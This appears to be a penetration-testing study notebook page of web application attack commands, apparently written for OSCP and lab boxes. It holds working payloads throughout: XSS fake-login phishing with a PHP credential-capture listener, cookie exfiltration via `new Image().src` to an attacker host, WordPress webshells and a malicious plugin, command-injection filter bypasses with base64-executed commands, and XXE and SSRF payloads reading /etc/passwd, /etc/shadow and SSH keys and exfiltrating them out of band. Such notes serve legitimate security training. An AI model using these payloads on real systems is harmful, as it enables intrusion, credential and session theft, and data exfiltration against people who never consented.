# Web Applications, Command Appendix

Part of [[COMMAND APPENDIX]]. Burp Suite, XSS, API enumeration, CMS-specific attack chains, and command injection diagnosis.

---

## Burp Suite

```bash
burpsuite   # or Kali menu: Applications → 03 Web Application Analysis → burpsuite
```
**Setup:** Temporary project → Use Burp defaults → Start Burp. Proxy tab → Intercept sub-tab → toggle off (only turn on when you actually want to tamper with a request). Proxy → Options confirms the listener, default `127.0.0.1:8080`. Point the browser's manual proxy config at that same host/port (Firefox: `about:preferences#general` → Network Settings → Manual proxy configuration, enable "also for HTTPS").

**Repeater:** right-click any request in **Proxy → HTTP History** → **Send to Repeater** → edit → **Send**, resend and tweak the same request as many times as needed.

**Intruder** (brute forcing/fuzzing across a payload list):
1. Send a captured request to Intruder.
2. **Positions** tab → **Clear** the auto-marked positions, select just the value to vary, **Add**.
3. **Payloads** tab → paste candidates under **Payload Options: [Simple list]**.
4. **Start attack**, look for a response with a different status code or length than the rest, that's the hit.

**Intruder Payload Processing pipeline** (when each payload needs encoding before sending):
- Add → Rule type: **Add prefix** → paste the fixed prefix (e.g. partial hash)
- Add → Rule type: **Encode: Base64-encode**
- Add → Rule type: **Encode: Encode as ASCII hex**
Rules run top-to-bottom. Match the encoding order the server applies (decode the cookie to find the stack, then reverse it for encoding).

**Decoder** (stripping layered encoding from a captured value):
Decoder tab → paste → Decode as → Base64 (repeat per layer) → Decode as → URL for a URL-encoded final layer. Each decoded output appears below the previous; chain as many rounds as needed.

**Proxy tools through Burp:**
```bash
# Metasploit — set per module
set PROXIES HTTP:127.0.0.1:8080

# curl
curl http://$BoxIP --proxy http://127.0.0.1:8080

# Environment variable (affects most HTTP tools)
export HTTP_PROXY="http://127.0.0.1:8080"
unset HTTP_PROXY    # clean up after
```

**Keyboard shortcuts:**
- `Ctrl+R` → Send to Repeater
- `Ctrl+I` → Send to Intruder
- `Ctrl+U` → URL-encode the selected text in the Intercept/Repeater editor

```bash
# Add a static hosts entry first if the target needs a stable internal hostname
echo "$BoxIP <hostname>" | sudo tee -a /etc/hosts
```

> **Gotcha:** if Firefox's proxy is still pointed at Burp and Burp itself gets closed, Firefox stops working entirely until Burp's restarted or the proxy setting is reverted.

See [[08. Introduction to Web Application Attacks#8.2.4. Security Testing with Burp Suite|8.2.4]], [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]] (Decoder multi-round chain, Intruder processing pipeline).

---

## ZAP (OWASP ZAP)

```bash
zaproxy   # or: owasp-zap, Applications menu
# Default listener: 127.0.0.1:8090 — set FoxyProxy to ZAP (8090)
```

**Fuzzer** (equivalent to Burp Intruder):
1. Capture a request → right-click → **Attack → Fuzz**.
2. Select the value to fuzz → **Add** → Type: File → Select wordlist → OK.
3. Click **Processors** → Add → Type (e.g. **MD5 Hash** to hash each candidate before sending) → Add → OK → OK.
4. **Start Fuzzer**. Sort results by **Size Resp. Body** to find the outlier.

**Scanner** (active vulnerability scanning):
1. Browse to the target (one request in ZAP history is enough).
2. Right-click the site → **Attack → Spider** → Start Scan (crawls all paths).
3. Right-click the site folder → **Attack → Active Scan** → Start Scan.
4. Watch the **Alerts** tab. Stop when a **High** severity alert appears.
5. Right-click the finding's request → **Open/Resend with Request Editor** to manually exploit the found vulnerability.

**Replacer** (auto-modify responses in transit, client-side restriction bypass):
- `Ctrl+R` → **Add...** → Match Type: **Response Body String** → Match String: `disabled>` → Replacement: `>` → Enable → Save.
- Every subsequent response from the target has `disabled>` stripped before Firefox receives it. Buttons, fields, and form controls rendered as enabled.

See [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]] (full ZAP Fuzzer, Scanner, Replacer workflows).

#### Tags: #BurpSuite #BurpProxy #BurpRepeater #BurpIntruder #BurpDecoder #BurpProcessing #ZAP #ZAPFuzzer #ZAPScanner #ZAPReplacer #FoxyProxy #EtcHosts

---

## XSS Testing and Basic Payloads

**Probe characters**, throw these into any field that gets echoed back and see what survives unencoded:
```
< > ' " { } ;
```
`<`/`>` are HTML tag delimiters, `{`/`}` are JS block delimiters, `'`/`"` are string delimiters, `;` is a statement terminator. If the app doesn't strip or HTML-encode them, it may be treating your input as code.

**Proof-of-concept payloads** (use the simplest one that fits the context):
```html
<script>alert(1)</script>                  <!-- standard, inside plain HTML -->
"><script>alert(1)</script>                <!-- closes a " attribute then injects -->
'><script>alert(1)</script>                <!-- closes a ' attribute then injects -->
'><img src=x onerror=alert(1)>             <!-- event-handler variant; works where <script> is blocked or inside DOM sinks -->
<img src="" onerror=alert(document.cookie)>  <!-- DOM XSS: blank src triggers immediate onerror -->
```

**Cookie theft PoC** (replace `alert(1)` with `alert(document.cookie)` in any of the above):
```html
<script>alert(document.cookie)</script>
```

```bash
# Delivery via a header instead of a form field, e.g. testing User-Agent for stored XSS
curl -i http://$BoxIP --user-agent "<script>alert(1)</script>" --proxy 127.0.0.1:8080
```

**XSS type quick reference:**
| Type | Payload lives | Who triggers | Detection |
|------|--------------|-------------|-----------|
| Stored | Database | All visitors | Submit and view the rendering page |
| Reflected | URL param / POST body | Whoever opens crafted URL | Manipulate params directly |
| DOM | Client-side JS source → sink | Whoever opens crafted URL | Compare raw HTTP response vs browser DOM |

> 🔗 **PayloadsAllTheThings** XSS Injection: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), large payload set for filtered contexts. [HackTricks XSS](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/README.md).

### XSS — Phishing via Fake Login Form

When you've confirmed XSS and want to harvest credentials, inject a fake form and run a PHP listener:

```javascript
// Full payload (replace PWNIP:PWNPO, adjust urlform id to match the page's real form id)
'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

**PHP credential capture listener** (save as `index.php`, run in its own directory):
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET/real-login.php");  // redirect to real site so victim doesn't notice
    fclose($file);
    exit();
}
?>
```

```bash
mkdir -p /tmp/tmpserver && cd /tmp/tmpserver
# place index.php here, then:
php -S 0.0.0.0:8080
```

Credentials arrive as GET params (`?username=admin&password=...`) in the PHP server log.

### XSS — Session Hijacking (Cookie Exfiltration)

When you want to steal a session cookie and impersonate the victim:

**`script.js`** (the exfil payload, loaded via `<script src=...>` in the XSS):
```javascript
new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
```

`new Image().src` fires a GET request cross-origin without CORS or any visible effect. The cookie string appends as `?c=`.

```bash
cat << 'EOF' > script.js
new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
EOF
```

**`index.php`** (PHP cookie capture server, split multiple cookies, write to file):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
# Start server in the directory containing both files:
php -S 0.0.0.0:8080
```

**XSS payload to load the script remotely** (inject into vulnerable field):
```javascript
"><script src=http://PWNIP:PWNPO/script.js></script>
```

**Using the stolen cookie** (Firefox DevTools):
1. Navigate to the target login page
2. Open DevTools → **Storage** tab → **Cookies** → select the site
3. Add cookie manually: Name = `session` (or whatever the cookie was named), Value = `<stolen value>`
4. Refresh, authenticated as victim

### XSS — Blind XSS Detection (Admin Bot Scenarios)

When submitted content goes through an admin review before being visible, you can't see XSS execution directly. Use a unique filename per field to fingerprint via outbound HTTP:

```bash
# Start listener
nc -nvlp 9001

# Submit this payload to each form field, substituting the field name:
'><script src="http://PWNIP:9001/FieldName"></script>
```

The field that causes a `GET /FieldName` request to arrive at nc is the vulnerable one. The `HeadlessChrome` or `HTBXSS/1.0` User-Agent in the request confirms an automated bot is visiting the page.

Once the vulnerable field is confirmed, swap nc for the full PHP server and use `script.js` + `index.php` (above) to steal the admin's cookie.

See [[08. Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnerabilities|8.4.3]], [[08. Introduction to Web Application Attacks#8.4.4. Basic XSS|8.4.4]], [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]] (full phishing/session hijack/blind XSS workflows), and the WordPress-nonce-theft chain in [[Web Applications (Breakdowns)#Nonce theft + eval(String.fromCharCode(...)): stored XSS to WordPress admin account|Command Breakdowns]].

#### Tags: #XSS #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS #SessionHijacking #CookieTheft #XSSPhishing #NewImage #PHPServer

---

## API Enumeration

```bash
# Brute force versioned API paths with a pattern file (containing {GOBUSTER}/v1, {GOBUSTER}/v2, etc)
gobuster dir -u http://$BoxIP:$Port -w /usr/share/wordlists/dirb/big.txt -p pattern

# Probe a discovered endpoint directly
curl -i http://$BoxIP:$Port/<endpoint>

# Try a different HTTP method if you get 405 instead of 404 (path exists, wrong verb)
curl -i -X PUT http://$BoxIP:$Port/<endpoint>

# Register with an undocumented/guessed privileged field (mass assignment)
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://$BoxIP:$Port/users/v1/register

# Use a returned auth token (JWT, etc) against a protected endpoint
curl -X 'PUT' 'http://$BoxIP:$Port/<endpoint>' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <token>' \
  -d '{"key": "value"}'
```
*`{GOBUSTER}` is a placeholder Gobuster substitutes per wordlist entry, then appends the pattern file's version suffix. `405 METHOD NOT ALLOWED` (not `404`) is the tell that a path exists but wants a different HTTP verb than the one just tried, see [[Web Applications (Breakdowns)#Why 405 (not 404) means the path exists, just the wrong HTTP method|Command Breakdowns]] for the full reasoning.*

See [[08. Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|8.3.3]], mass-assignment mechanics in [[Web Applications (Breakdowns)#Mass-assignment registration payload (undocumented admin field)|Command Breakdowns]].

> ⚡ **Modern tool:** [[Kiterunner]] automates the pattern-file guessing above with wordlists built from real OpenAPI/Swagger specs, and tries the correct HTTP method per route automatically.

#### Tags: #APIEnumeration #RESTAPI #GobusterPattern #MassAssignment #JWT

---

## WordPress

```bash
# WPScan — full enumeration (plugins, themes, users, upload dir, timthumbs)
wpscan --url http://$BoxIP --enumerate

# User enumeration only
wpscan --url http://$BoxIP --enumerate u

# Brute force via xmlrpc (faster + often less filtered than wp-login)
wpscan --password-attack xmlrpc -t 20 -U $Username -P /usr/share/wordlists/rockyou.txt --url http://$BoxIP

# Directory listing on /wp-content/uploads/ (flagged by WPScan when enabled)
# Browse: http://$BoxIP/wp-content/uploads/YYYY/MM/ — files left publicly accessible
curl http://$BoxIP/wp-content/uploads/

# Fingerprint installed plugin version (no auth needed)
curl http://$BoxIP/wp-content/plugins/<plugin-name>/readme.txt
# Look for the "Stable tag:" line, then search for a matching public exploit
searchsploit <plugin name>

# Unauthenticated SQLi is common via admin-ajax.php, every plugin's AJAX actions route
# through this one shared endpoint regardless of login state
sqlmap -u "http://$BoxIP/wp-admin/admin-ajax.php?action=<plugin_action>&<param>=1" -p <param> --batch --ignore-code=404

# Crack a dumped wp_users phpass hash ($P$... or $H$...) with John
echo 'admin:$P$$AdminHash' > wp_hash.txt
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp_hash.txt

# Admin-to-RCE option 1: Appearance > Theme File Editor, paste into any template (e.g. 404.php)
<?php system($_GET['cmd']); ?>
# then trigger it by requesting a nonexistent URL (forces 404.php to render)
curl "http://$BoxIP/nonexistent-page?cmd=id"

# Admin-to-RCE option 2 (use if option 1 fails with "Unable to communicate back with
# site, so the PHP change was reverted", WP's fatal-error-protection loopback check
# failing, common on isolated lab networks): upload a malicious plugin zip instead,
# no loopback check happens at upload time
mkdir /tmp/shell && cat > /tmp/shell/shell.php << 'EOF'
<?php
/*
Plugin Name: shell
*/
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell
# Then in the dashboard: Plugins > Add New > Upload Plugin > shell.zip > Install > Activate
curl "http://$BoxIP/?cmd=id"
```
*The plugin-upload webshell has no hook, so it runs on every single page load once activated, not just a specific route. Same `cmd`-parameter pattern as every other webshell in this vault, just delivered via plugin activation instead of file upload/SQLi/theme edit.*

See [[10. SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (Perfect Survey plugin, CVE-2021-24762) for the full worked walkthrough.

#### Tags: #WordPress #WPScan #PluginRCE #PhpassCracking #AdminAjax

## Blocky: slow WordPress API and exposed Java plugin

Use the REST route when a WordPress author endpoint or broad scanner is slow. Preserve both the response and timing evidence. A timeout on a dynamic endpoint does not by itself prove a broken VPN.

~~~bash
curl -sS --max-time 60 "http://$BoxIP:$WebPort/index.php/wp-json/wp/v2/users" \
  -o "$BoxDir/loot/wp-users.json"
python3 -m json.tool "$BoxDir/loot/wp-users.json"
curl -sS --max-time 60 "http://$BoxIP:$WebPort/plugins/" \
  -o "$BoxDir/loot/plugins.html"
curl -sS --max-time 60 "http://$BoxIP:$WebPort/plugins/scan.php" \
  | tee "$BoxDir/loot/plugins-scan.json"
curl -sS --max-time 60 "http://$BoxIP:$WebPort/plugins/files/$File" \
  -o "$BoxDir/loot/$File"
file "$BoxDir/loot/$File"
jar tf "$BoxDir/loot/$File" \
  | tee "$BoxDir/loot/binary-analysis/jar-contents.txt"
javap -classpath "$BoxDir/loot/$File" -c -p "$ClassName" \
  | tee "$BoxDir/loot/binary-analysis/$ClassName.javap.txt"
~~~

Route the JAR to [[OSCP/RUNBOOK V2/Linux - Binary Analysis|Linux - Binary Analysis]] and the recovered candidate to [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]]. Validate one likely credential once, then use [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]]. See [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] for the complete evidence chain.

---

## Webmin

```
https://$BoxIP:10000
```
*A full system administration panel. Any valid login (root or otherwise) with sufficient rights is functionally the same as remote code execution as whatever user owns the Webmin process, usually root: **System → Scheduled Cron Jobs → Create a new scheduled cron job**, set "Execute as user" to `root`, put a reverse shell one-liner in Command, set it to run within the next minute, save. Start a listener before it fires.*

*Credentials for Webmin are very often the same ones leaked from an unrelated config file elsewhere on the box, worth trying any password found during recon here even if it wasn't "meant" for Webmin.*

*If the target only supports old TLS (`TLSv1.0`/`SSLv3`, common on old CentOS-era boxes), force it explicitly rather than fighting a browser's default refusal:*
```bash
curl -k --tlsv1.0 "https://$BoxIP:10000" 2>/dev/null
```

See [[OSCP/BOXES/MASTER BOX LIST|Beep box writeup]] for the full worked chain (credential reuse into Webmin, cron job to root).

#### Tags: #Webmin #ScheduledCronJob #TLSDowngrade #CredentialReuse

---

## Command Injection Diagnosis

```bash
# Replace a command-shaped parameter value entirely with a harmless command
curl -X POST --data 'param=<harmless-command>' http://$BoxIP/<endpoint>

# Chain a second command (URL-encoded ; or &&, CMD also accepts single &)
curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://$BoxIP/<endpoint>

# No command-shaped hint at all? Work through systematically:
curl -X POST --data 'param=1%2B1' http://$BoxIP/<endpoint>       # eval()? expect "2"
curl -X POST --data 'param={{7*7}}' http://$BoxIP/<endpoint>     # Jinja2 SSTI? expect "49"
curl -X POST --data-urlencode 'param=`id`' http://$BoxIP/<endpoint>   # plain OS injection

# CMD vs PowerShell detection on Windows (credit: PetSerAl)
# (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
See [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]] (both case studies, including the systematic diagnostic sequence from the capstone).

#### Tags: #CommandInjection #BlindCommandInjection #DiagnosticMethodology

---

## Command Injection — Operator Table

| Operator | URL-encoded | Bash behavior | Output shown |
|----------|------------|--------------|-------------|
| `;` | `%3B` | Run both sequentially | Both commands |
| `\n` (new-line) | `%0a` | Same as `;` in bash | Both commands |
| `&` | `%26` | Both run; second in background | Both (may interleave) |
| `&&` | `%26%26` | Second runs only if first succeeds | Both (conditional) |
| `\|` | `%7c` | Pipe first stdout → second stdin | Second only |
| `\|\|` | `%7c%7c` | Second runs only if first fails | Second only (conditional) |

**`|` (pipe)** is the cleanest output channel when you only want the injected command's output, not the original command's noise.

**`%0a` (new-line)** is the most commonly missed operator in WAF/filter rules, always try it when `;` is blocked.

**`%26` (`&`)** is often whitelisted as a normal URL query string delimiter; the shell still treats it as a background operator.

See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.1]].

#### Tags: #CommandInjection #InjectionOperators

---

## Command Injection — Filter Bypass Ladder

When individual characters are filtered, work through this ladder in order:

### Space Filter Bypass

| Bypass | Example | Notes |
|--------|---------|-------|
| `$IFS` | `ls$IFS-la` | Internal Field Separator — bash expands to whitespace |
| `${IFS}` | `ls${IFS}-la` | Explicit brace form; use when `$IFS` is ambiguous |
| `%09` | `ls%09-la` | URL-encoded tab — bash treats as whitespace |
| `{cmd,-args}` | `{ls,-la}` | Brace expansion — no space in payload |

### Character Filter Bypass (slashes and other special chars)

```bash
${PATH:0:1}     # extracts '/' — PATH always starts with /
${HOME:0:1}     # also extracts '/'
# Syntax: ${VAR:START:LENGTH} — bash substring
# Usage:
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
ls${IFS}${PATH:0:1}home
```

### Command Blacklist Bypass (quote insertion)

```bash
c'a't           # bash strips quotes → runs: cat
c"a"t           # same — works with double quotes
w'h'o'a'm'i    # whoami
l's'            # ls
/bin/c'a't      # path + command both obfuscated
```

Bash removes unescaped single/double quotes before execution. String comparison blacklists see `c'a't`, not `cat`.

### Full Obfuscation — Base64

Encode the entire command to bypass all character-level filters at once:

```bash
# On your Kali box — encode the command
echo -n 'cat /etc/passwd' | base64
# Output: Y2F0IC9ldGMvcGFzc3dk

# Decode + execute on the target (no pipe character needed)
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

**`<<<` here-string** feeds a string to a command's stdin without using `|`. Two levels: inner `<<<` feeds the base64 string to `base64 -d`; outer `<<<` feeds the decoded plaintext command to `bash`. No `|` appears in the payload.

**Combined filter bypass payload** (new-line + tab + base64):
```
ip=127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
```

**Common base64 values:**
```bash
echo -n 'cat /flag.txt' | base64   # Y2F0IC9mbGFnLnR4dA==
echo -n 'id' | base64               # aWQ=
echo -n 'whoami' | base64           # d2hvYW1p
```

**Error-based output channel** (skills assessment pattern): make the first command fail (missing argument, invalid path) to trigger the app's error output path, then chain the real command with `&`, the error response leaks the second command's output.

See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|command-injection filter bypass techniques]].

#### Tags: #CommandInjection #FilterBypass #SpaceBypass #SlashBypass #QuoteInsertion #Base64Obfuscation #HereString #IFS #PATH

## Source archive to asynchronous filename injection

When a web directory exposes a backup archive, download and inspect it before guessing at application behavior. Source review can reveal the exact upload field and a later cron worker that passes the stored filename into a shell command.

```bash
curl -sS "http://$BoxIP/backup/backup.tar" -o "$BoxDir/loot/backup.tar"
tar -tvf "$BoxDir/loot/backup.tar"
mkdir -p "$BoxDir/loot/source"
tar -xf "$BoxDir/loot/backup.tar" -C "$BoxDir/loot/source"
grep -RniE 'upload|move_uploaded_file|exec\(|system\(|cron|filename|mime' "$BoxDir/loot/source"
```

For a filename-driven worker, prove execution with a harmless marker such as `x;touch${IFS}cron_marker`, wait for the scheduled interval, and check the marker owner. Encode the callback command with base64 before creating the filename. This pattern is asynchronous and should be routed through [[Linux - Command Injection]] and [[Linux - Cron Check]].

---

## HTTP Verb Tampering

Switch the HTTP method to bypass per-method restrictions. Two scenarios:

**1. Basic auth bypass**, server requires auth for GET/POST on a path but not for OPTIONS/PATCH:

```
# In Burp Repeater: change the request line from
GET /reset.php HTTP/1.1
# to
OPTIONS /reset.php HTTP/1.1
# or PATCH, HEAD, PUT — try OPTIONS first
```

**2. Security filter bypass**, a WAF/input filter only checks POST body, not GET params:

```
# In Burp: right-click → "Change request method"
# Burp automatically rewrites POST → GET and moves body params to URL query string
# The endpoint handler reads $_REQUEST (catches GET+POST) so it still works;
# the filter that checked $_POST never fires
```

> 🔍 Worth remembering generally: Apache `<Limit GET POST>` and PHP `$_SERVER['REQUEST_METHOD']` checks are the two most common places this misconfiguration lives. If auth or a filter kicks in on POST but not on the alternate method, the access control was only applied to selected methods.

See [[09. Common Web Application Attacks#9.5.1. HTTP Verb Tampering|HTTP verb tampering]].

#### Tags: #HTTPVerbTampering #BasicAuthBypass #SecurityFilterBypass #OPTIONS

---

## IDOR — Insecure Direct Object Reference

**Mass enumeration (POST-based, extract hrefs):**

```bash
#!/bin/bash
url="http://$1"
for i in {1..20}; do
    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); do
        wget -q $url$link
    done
done
# Usage: bash script.sh STMIP:STMPO
# Then: ls -lAS $BoxDir | head; cat flag_*.txt
```

**Mass enumeration (GET-based, API path, JSON response):**

```bash
#!/bin/bash
for uid in {1..100}; do
    curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
done | grep -i "admin" | jq .
```

**Encoded references (base64 of uid):**

```bash
# Identify: view page source → href="/download.php?contract=<BASE64>" → echo -n 1 | base64 matches first record
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do    # -w 0 disables line-wrap
        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
    done
done
# ls -lAS to find non-empty file, cat it
```

**MD5-encoded references:**

```bash
for i in {1..20}; do
    hash=$(echo -n $i | md5sum | cut -d' ' -f1)
    curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
done
```

**API IDOR (path-based uid):**

```
# Intercept: GET /api.php/profile/1 → change 1 to target uid in Burp Repeater
GET /api.php/profile/5 HTTP/1.1
# Response JSON contains uuid, role, email — all needed for write operations
```

**Chaining read → write (account takeover pattern):**

```bash
# Step 1: get target user's uuid via GET IDOR
curl -s "http://STMIP:STMPO/api.php/profile/52"
# {"uid":"52","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","email":"admin@employees.htb"}

# Step 2: intercept your own "Edit Profile" PUT/POST, modify uid+uuid+email to target's values
# Body: {"uid":"52","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","email":"flag@idor.htb"}
# → The server accepts uuid as proof of identity; uuid was readable via IDOR
```

See [[09. Common Web Application Attacks#9.5.2. IDOR (Insecure Direct Object Reference)|IDOR enumeration and exploitation]].

#### Tags: #IDOR #InsecureDirectObjectReference #MassEnumeration #EncodedReferences #APIEnumeration #IDORChain

---

## XXE — XML External Entity Injection

**Identifying XXE:** intercept form submissions, look for `Content-Type: application/xml` or `<?xml` in body. Inject `<!ENTITY test "HELLO">` and reference `&test;` in a reflected field, if "HELLO" appears, entities are resolved.

**Basic file read:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><email>&xxe;</email></root>
```

**PHP source disclosure (php://filter — avoids `<?php` breaking raw XML):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
<root><email>&xxe;</email></root>
```

Decode the response blob in Burp Inspector or `echo 'BLOB' | base64 -d`.

**CDATA method (for files with XML-breaking chars `<` `>` `&`):**

```bash
# Step 1: external DTD (on your Kali box)
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
python3 -m http.server 8000

# Step 2: payload
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://PWNIP:8000/XXE.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```
The external DTD assembles `%begin;%file;%end;` → `<![CDATA[<file content>]]>` as the regular entity `&joined;`. CDATA makes the parser treat file content as plain text.

**Error-based (file content appears in parse error — useful when no reflection):**

```bash
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF
python3 -m http.server 8000
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
    %remote;
    %error;
]>
```
`%nonExistingEntity;` fails → parse error message includes the attempted URI → file content leaks in the error.

**Blind OOB exfiltration (no output at all — watch HTTP server log):**

```bash
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/path/to/secret.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:8000/?content=%file;'>">
EOF
python3 -m http.server 8000
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
    %remote;
    %oob;
]>
<root>&content;</root>
```
Two requests appear in HTTP server log: DTD fetch, then `GET /?content=BASE64BLOB`. Decode:
```bash
echo 'BASE64BLOB' | base64 -d
```

See [[09. Common Web Application Attacks#9.5.3. XXE (XML External Entity Injection)|XXE disclosure and blind exfiltration]], [[09. Common Web Application Attacks#9.3.3. Advanced Upload Filter Bypasses|SVG XXE]], [[09. Common Web Application Attacks#9.2.2. PHP Wrappers|php://filter]].

#### Tags: #XXE #XMLExternalEntity #LocalFileDisclosure #CDATAMethod #ErrorBasedXXE #BlindXXE #OOBExfiltration #ExternalDTD #PHPFilter

### DevOops: multipart XML XXE to source-driven pickle proof

When a custom Python application accepts a file upload containing XML, read the form first and use the exact multipart field. Confirm XXE with `/etc/passwd`, then read the handler source to learn the next request format:

```bash
boxset UploadURL "http://$BoxIP:$WebPort/upload"
boxset FileField "file"
curl -sS "$UploadURL" | tee "$BoxDir/loot/upload.txt"
curl -sS -F "$FileField=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
  "$UploadURL" | tee "$BoxDir/loot/xxe-passwd.txt"
```

If source review shows `pickle.loads()` on request-controlled bytes, prove execution with a protocol-compatible payload and a harmless identity command. The response channel is preferable to a callback for the first proof:

```bash
boxset PickleURL "http://$BoxIP:$WebPort/newpost"
Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"
curl -sS -X POST --data-binary "$Payload" \
  -H 'Content-Type: application/octet-stream' "$PickleURL" \
  | tee "$BoxDir/loot/pickle-id.txt"
```

Once a shell or SSH foothold exists, search the complete Git history. A removed integration key may remain usable in an earlier commit:

```bash
git -C "$GitRepo" log --oneline --all
git -C "$GitRepo" show "$Commit:$HistoryPath" > "$HistoryKeyFile"
chmod 600 "$HistoryKeyFile"
ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
```

Seen in [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]]. The safe path is `/etc/passwd` proof, source disclosure, `id` proof, mechanical key extraction, then historical Git review.

### MarkUp: Windows File Read and SSH Key Extraction

For an authenticated XML endpoint that reflects the `<item>` element, test a safe Windows file first, then target a user's key:

```bash
curl -s -b "$CookieFile" -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  "http://$BoxIP:$WebPort/process.php"

curl -s -b "$CookieFile" -H 'Content-Type: text/xml' \
  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Users/$Username/.ssh/id_rsa">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
  "http://$BoxIP:$WebPort/process.php" -o "$ResponseFile"
```

Extract a multiline key mechanically and validate it. Do not copy it from a wrapped terminal response:

```bash
awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' "$ResponseFile" \
  | sed -e 's/^.*\(-----BEGIN OPENSSH PRIVATE KEY-----\)/\1/' \
        -e 's/\(-----END OPENSSH PRIVATE KEY-----\).*/\1/' > "$KeyFile"
chmod 600 "$KeyFile"
ssh-keygen -y -f "$KeyFile"
```

Seen in [[MarkUp]]. The safe hosts-file read proves external entities work before the higher-value key read.

---

---

## SSRF via PDF XMLHttpRequest (Local File Read)

Some web apps generate PDFs server-side by rendering HTML with a headless browser (wkhtmltopdf, Puppeteer, PhantomJS). If user input is embedded in the HTML before rendering, JavaScript executes in the server's context and can read local files.

**Identification:** Input field → app returns a PDF download. Suspect server-side rendering.

**Payload (inject into the field that gets rendered into the PDF):**

```javascript
<script>
    x = new XMLHttpRequest;
    x.onload = function() {
        document.write(this.responseText)
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

Common local file targets:

```
file:///etc/passwd          → OS users
file:///etc/shadow          → hashed passwords (if readable)
file:///flag.txt            → CTF flags in web root
file:///var/www/html/flag.txt
file:///proc/net/fib_trie   → internal IP discovery
file:///proc/self/environ   → environment variables + secret keys
```

**Why it works:** The headless browser executes JavaScript in the rendering engine. `XMLHttpRequest` with a `file://` URI reads from the server's own filesystem when called from server-side rendering context. The read file contents get written into the PDF's HTML, which then appears in the downloaded PDF.

